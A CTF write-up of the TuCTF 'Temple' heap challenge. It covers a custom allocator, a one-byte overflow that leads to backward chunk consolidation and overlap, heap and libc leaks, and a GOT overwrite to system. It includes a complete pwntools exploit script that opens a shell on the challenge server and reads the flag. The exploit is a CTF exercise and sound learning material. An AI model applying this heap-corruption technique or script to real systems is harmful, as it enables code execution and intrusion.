---
layout: post
comments: true
title: Temple - TuCTF (500 pts)
---

The challenge implements a custom memory allocator whose source code was already given. I didn't bother reading it since a
simple understanding through dynamic analysis can yeild much faster solutions.

checksec output:
```
gef> checksec 
[+] checksec for '/home/vagrant/tu-ctf/temple'
Canary                        : Yes-> value: 0x64b0fa8cb0d72000
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
gef> 
```

Partial RelRO : meaning GOT entries can be overwritten.
Program calls many (troll) functions like `time`, `srand`, `rand` to achieve some initialisation of the program. Again, I
didn't bother reading through it.

### Understanding the memory allocator

Try creating basic wisdom statements like "AAAAAAA", "BBBBB" etc. Then `xref` in gef and see the memory.

```
gef> xref AAAAAAAAA
[+] Searching 'AAAAAAAAA' in memory
[+] In '[heap]'(0x604000-0x627000), permission=rw-
  0x6251c0 - 0x6251cc ->  "AAAAAAAAAAAA" 
gef> x/20xg 0x6251b0
0x6251b0:	0x0000000000000031	0x0000000000000031
0x6251c0:	0x4141414141414141	0x0000000a41414141
0x6251d0:	0x0000000000000000	0x0000000000000000
0x6251e0:	0x0000000000000031	0x0000000000000031 <-- SIZE_PREVIOUS_CHUNK , SIZE_CURRENT_CHUNK
0x6251f0:	0x0000000000000015	0x0000000000625220
0x625200:	0x0000000000000008	0x0000000000401d61
0x625210:	0x0000000000000031	0x0000000000000031
0x625220:	0x4242424242424242	0x000a424242424242
0x625230:	0x0000000000000000	0x0000000000000000
0x625240:	0x0000000000000031	0x0000000000000dc0 
```

Upon freeing the chunk (by taking wisdom, ofcourse), we can see that the PREV_INUSE bit is unset.
We can check this by breaking at `mm_free`
```
gef> x/20xg 0x6251b0
0x6251b0:	0x0000000000000031	0x0000000000000031
0x6251c0:	0x4141414141414141	0x0000000000000a41
0x6251d0:	0x0000000000000000	0x0000000000000000 
0x6251e0:	0x0000000000000031	0x0000000000000031
0x6251f0:	0x0000000000000015	0x0000000000625220
0x625200:	0x0000000000000008	0x0000000000401d61
0x625210:	0x0000000000000031	0x0000000000000030 <-- CURRENT_INUSE is unset
0x625220:	0x4242424242424242	0x00000000000a4242
0x625230:	0x0000000000000000	0x0000000000000000
0x625240:	0x0000000000000030	0x0000000000000031 <-- PREV_INSUE bit is unset
0x625250:	0x0000000000000015	0x0000000000625280
0x625260:	0x0000000000000008	0x0000000000401d61
0x625270:	0x0000000000000031	0x0000000000000031
```

This is very similar to ptmalloc2() with a few differences:
1. Each chunk, irrespective of the environment, has a PREV_SIZE field set.
2. No concept of classifying chunks based on their size, so even fastbins can get coalesced.
3. No security checks !!

I assume it uses the PREV_SIZE field to check if a chunk can be consolidated backwards or not.

### Vulnerability

There is a one byte overflow along with a NULL byte overflow also when it asks for our data. When, it asks us to rethink,
it asks for one more byte of data. So we can maximise our data usage in a chunk and thus overflow the PREV_SIZE of next chunk.

Attack Vector: Backward Consolidation

This allows us to overlap 2 chunks and thus we can control the metadata chunk. So we overflow with "\x90" byte and then
when we free the next chunk, it will think previous chunk is free and perform consolidation.

```
0x21bd210:	0x0000000000000031	0x0000000000000031
0x21bd220:	0x4141414141414141	0x4141414141414141
0x21bd230:	0x4141414141414141	0x4141414141414141
0x21bd240:	0x0000000000000000	0x0000000000000090 <---SUCCESS
0x21bd250:	0x0000000000000021	0x00000000021bd280    |
0x21bd260:	0x0000000000000008	0x0000000000401d61    |
0x21bd270:	0x0000000000000030	0x0000000000000030    |
0x21bd280:	0x4242424242424242	0x4242424242424242    |
0x21bd290:	0x4242424242424242	0x4242424242424242    |
0x21bd2a0:	0x0000000000000030	0x0000000000000031    |
0x21bd2b0:	0x0000000000000021	0x00000000021bd2e0    |
0x21bd2c0:	0x0000000000000008	0x0000000000401d61    |
0x21bd2d0:	0x0000000000000090	0x0000000000000031<---|
0x21bd2e0:	0x4141414141414141	0x4141414141414141
0x21bd2f0:	0x4141414141414141	0x4141414141414141
```
Now allocate(70 bytes). Lets see if we can get an allocation from this 0x90 chunk without breaking anything.

```
0x21bd240:	0x0000000000000000	0x0000000000000031 
0x21bd250:	0x0000000000000047	0x00000000021bd280
0x21bd260:	0x0000000000000008	0x0000000000401d61
0x21bd270:	0x0000000000000031	0x0000000000000061 <-- SUCCESS
0x21bd280:	0x0a58585858585858	0x4242424242424200
0x21bd290:	0x4242424242424242	0x4242424242424242
0x21bd2a0:	0x0000000000000030	0x0000000000000031
0x21bd2b0:	0x0000000000000021	0x00000000021bd2e0
0x21bd2c0:	0x0000000000000008	0x0000000000401d61
0x21bd2d0:	0x0000000000000061	0x0000000000000031
```

### Heap Leak

The metadata chunk contains some important pointers regarding the size of our data, pointer to our data and a
string called "Neonate". When we overlap using the backward consolidation technique, we automatically affect the size field
of our data. So when we print the data, it uses a size variable from the metadata chunk to see how many bytes to print,
instead of using just some string function to print (which automatically stops at "\x00").

So fgets() and a NULL byte cannot stop us from leaking.
We can thus leak address `0x21bd2b0` , which technically is a metadata chunk, has been overlapped with a data chunk.

### Libc Leak

The string called "Neonate" is actually printed everytime we free. So we can overwrite that with a got address.

### Exploit

Finally, we overwrite the `FD` pointer of the chunk and make it point to a GOT address instead of our normal heap data chunk.
Then we can use the `rethink` function to edit it. (Thanks rex for making me realise this......Partial RELRO is just LOLZZZ)

```python
#!/usr/bin/python
from pwn import *

#p = process("./temple")
elf = ELF("./libc.so.6")
p = remote("temple.tuctf.com", 4343)
raw_input()

def menu():
	p.recvuntil("choice:")

def give_wisdom(length,wisdom):
	menu()
	p.sendline("2")
	p.recvuntil("hold?:")
	p.sendline(str(length))
	p.recvuntil("wisdom?:")
	p.sendline(wisdom)

def take_wisdom(idx):
	menu()
	p.sendline("1")
	p.recvuntil("seek?:")
	p.sendline(str(idx))
	leak = p.recvuntil("\n")
	return leak

def rethink(idx,wisdom):
	menu()
	p.sendline("3")
	p.recvuntil("rethink?:")
	p.sendline(str(idx))
	p.recvuntil("differently?:")
	p.sendline(wisdom)

buf = "A"*32
give_wisdom(32,buf)	# 8
give_wisdom(32,buf)	# 9
give_wisdom(32,buf)	# 10
give_wisdom(32,buf)	# 11

payload = "B"*32
payload += "\xf0"

rethink(10,payload)

take_wisdom(10)

buf = "X"*7
'''
buf += p64(0x30)
buf += p64(0x31)
buf += p64(0x21)
buf += p32(0x00603018)	# puts@got
'''
give_wisdom(70,buf)	# 12

leak = take_wisdom(12)
leak = p.recvuntil("Neonate")

leak = leak[48:56]
heap_leak = u64(leak)
log.success("Heap: " + hex(heap_leak))

buf = "a"*32
buf += p64(0x31)*2
buf += p64(0x21)
buf += p64(heap_leak)
buf += p64(0x8)
buf += p64(0x603018)

give_wisdom(80,buf)	# 13

leak = take_wisdom(11)
leak = leak[::-1]
leak = leak[0:9]
leak = leak[::-1]
leak = leak.strip("\n")
libc_leak = u64(leak) - elf.symbols['puts']

log.success("Libc: " + hex(libc_leak))

buf = "C"*32
give_wisdom(32,buf)	# 14
give_wisdom(32,buf)	# 15
give_wisdom(32,buf)	# 16
give_wisdom(32,buf)	# 17

payload = "D"*32
payload += "\x90"
rethink(15,payload)

take_wisdom(16)

payload = p64(0x21)
payload += p64(0x0000000000603098)

give_wisdom(80,payload)	# 18

final = p64(libc_leak + elf.symbols['system'])
rethink(15,final)

p.interactive()
```

Output:

```
vagrant@kali:~/tu-ctf$ python exploit_temple.py 
[*] '/home/vagrant/tu-ctf/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to temple.tuctf.com on port 4343: Done

[+] Heap: 0x1e342e0
[+] Libc: 0x7fd697366000
[*] Switching to interactive mode
 
Child, what do you seek?
[1] Take wisdom
[2] Give wisdom
[3] Rethink wisdom
Your choice: $ sh
$ pwd
/home/admin/chal
$ ls
flag.txt
start.sh
temple
temple.txt
$ cat flag.txt
TUCTF{0n3_Byt3_0v3rwr1t3_Ac0lyt3}
$ cat temple.txt
               )\         O_._._._A_._._._O         /(
                \`--.___,'=================`.___,--'/            You see before you
                 \`--._.__                 __._,--'/
                   \  ,. l`~~~~~~~~~~~~~~~'l ,.  /
       __            \||(_)!_!_!_.-._!_!_!(_)||/            __
       \\`-.__        ||_|____!!_|;|_!!____|_||        __,-'//   The Temple of Malloc
        \\    `==---='-----------'='-----------`=---=='    //
        | `--.                                         ,--' |
         \  ,.`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~',.  /    
           \||  ____,-------._,-------._,-------.____  ||/       Only the True will find divinity
            ||\|___!`======="!`======="!`======="!___|/||
            || |---||--------||-| | |-!!--------||---| ||
  __O_____O_ll_lO_____O_____O|| |'|'| ||O_____O_____Ol_ll_O_____O__
  o H o o H o o H o o H o o |-----------| o o H o o H o o H o o H o
 ___H_____H_____H_____H____O =========== O____H_____H_____H_____H___
                          /|=============|\
()______()______()______() '==== +-+ ====' ()______()______()______()
||{_}{_}||{_}{_}||{_}{_}/| ===== |_| ===== |\{_}{_}||{_}{_}||{_}{_}||
||      ||      ||     / |==== s(   )s ====| \     ||      ||      ||
======================()  =================  ()======================
----------------------/| ------------------- |\----------------------
                     / |---------------------| \
-'--'--'           ()  '---------------------'  ()
                   /| ------------------------- |\    --'--'--'
       --'--'     / |---------------------------| \    '--'
                ()  |___________________________|  ()           '--'-
  --'-          /| _______________________________  |\
 --' gpyy      / |__________________________________| \

$ 
```
